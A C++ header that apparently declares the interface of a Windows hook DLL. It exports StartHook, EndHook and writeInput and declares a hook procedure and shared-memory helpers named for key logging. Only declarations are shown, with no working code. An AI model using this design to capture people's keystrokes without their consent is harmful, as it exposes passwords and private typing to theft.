#pragma once
#include "pch.h"

static HINSTANCE hdll;
void initialize();

extern "C" __declspec(dllexport) void StartHook();
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam);
extern "C" __declspec(dllexport) bool EndHook();
DWORD WINAPI Thread(LPVOID pData);
extern "C" __declspec(dllexport) void writeInput();
//WPARAM* getSharedMemory(int size, LPCTSTR name);
HANDLE setKeyLogSharedMemory();
WPARAM* getKeyLogSharedMemory();
HANDLE setSharedMemory(int size, LPCTSTR name);
template<typename T> T* getSharedMemory(int size, LPCTSTR name);

